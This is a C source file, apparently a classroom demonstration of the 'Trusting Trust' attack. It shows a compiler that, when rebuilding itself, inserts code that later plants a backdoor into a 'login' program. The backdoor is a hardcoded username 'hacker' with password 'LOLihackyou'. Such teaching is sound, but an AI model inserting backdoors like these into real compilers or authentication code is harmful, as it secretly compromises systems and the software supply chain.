/****************************************************************************
 * compiler.c
 *
 * Rob Bowden
 * rob@cs.harvard.edu
 *
 * Compiles a C program
 *
 * If that C program happens to be "login", insert some code into it so we
 * can hack it.
 *
 * If that C program happens to be "compiler", insert some code into it
 * that handles the insertion of code into the "login" program.
 ***************************************************************************/

#include <stdio.h>
#include <string.h>
#include "compile.h"

int main(int argc, char* argv[])
{

    // check for proper usage
    if (argc < 2) {
        printf("Must specify a file to compile.\n");
        return 1;
    }

    // for our purposes, the "main" file that we might want to modify is
    // always the first argument
    char* file = argv[1];

    // read the entire file into a buffer
    int filesize = get_size_of_file(file);
    FILE* f = fopen(file, "r");
    char buffer[filesize + 1];
    fread(buffer, filesize, 1, f);

    // null-terminate the buffer
    buffer[filesize] = 0;

    // if we are compiling "compiler"
    if (strcmp(file, "compiler.c") == 0)
    {
        // the code we want to insert into our compiler so that it always
        // evilly compiles "login"
        const char* hack = "\
            if (strcmp(file, \"login.c\") == 0)\
            {\
                const char* hack = \"\
                    else if (strcmp(username, \\\"hacker\\\") == 0 &&\
                            strcmp(password, \\\"LOLihackyou\\\") == 0)\
                    {\
                        printf(\\\"Hacked!! You now have access.\\\\n\\\");\
                    }\";\
\
                int new_filesize = filesize + strlen(hack) + 1;\
                char new_buffer[new_filesize];\
                new_buffer[new_filesize - 1] = 0;\
\
                memcpy(new_buffer, buffer, filesize);\
                for (int i = 0; i < filesize; i++)\
                {\
                    char* pattern = \"// deny them access!\";\
                    int pattern_len = strlen(pattern);\
\
                    if (strncmp(pattern, new_buffer + i, pattern_len) == 0)\
                    {\
                        memmove(new_buffer + i + strlen(hack), new_buffer + i, filesize - i);\
                        memmove(new_buffer + i, hack, strlen(hack));\
                        break;\
                    }\
                }\
                compile(new_buffer, argc, argv);\
                return 0;\
            }\
        ";

        // we want to insert the above hack into our buffer, so make a new buffer
        // that's large enough to hold the original program plus the hack
        int new_filesize = filesize + strlen(hack) + 1;
        char new_buffer[new_filesize];

        // null-terminate our new buffer
        new_buffer[new_filesize - 1] = 0;

        // copy the original program into our buffer
        memcpy(new_buffer, buffer, filesize);

        // iterate over the entire original file
        for (int i = 0; i < filesize; i++)
        {
            char* pattern = "// compile the file";
            int pattern_len = strlen(pattern);

            // if we find the above pattern in the file, we want to insert our hack at
            // that position
            if (strncmp(pattern, new_buffer + i, pattern_len) == 0)
            {
                memmove(new_buffer + i + strlen(hack), new_buffer + i, filesize - i);
                memmove(new_buffer + i, hack, strlen(hack));
                break;
            }
        }

        // compile our new buffer (the original file + the hack)
        compile(new_buffer, argc, argv);
        return 0;
    }


    // compile the file
    compile(buffer, argc, argv);
    return 0;
}
